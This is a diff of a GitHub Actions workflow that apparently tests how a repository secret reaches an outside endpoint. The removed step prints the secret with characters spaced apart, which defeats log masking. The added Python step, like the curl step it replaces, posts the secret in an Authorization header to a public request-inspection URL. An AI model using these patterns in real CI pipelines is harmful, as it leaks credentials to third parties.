@@ -9,12 +9,16 @@ jobs:
     runs-on: ubuntu-latest
     
     steps:
-      - name: Debugging Output
-        run: echo ${{secrets.REQ_SECRET}} | sed 's/./& /g'
-
-      - name: Send POST request
+      - name: Send POST request using python
         # Inspect requests at https://public.requestbin.com/r/enw9z3kw0afbh
-        shell: bash
+        env:
+          REQ_SECRET: ${{ secrets.REQ_SECRET }}
         run: |
-          curl -H "Authorization: ${{ secrets.REQ_SECRET }}" -X POST "https://enw9z3kw0afbh.x.pipedream.net"
+          import os
+          import requests
+          headers = {
+            'Authorization': os.getenv("REQ_SECRET")
+          }
+          requests.request("POST", "https://enw9z3kw0afbh.x.pipedream.net", headers=headers)
+        shell: python
           
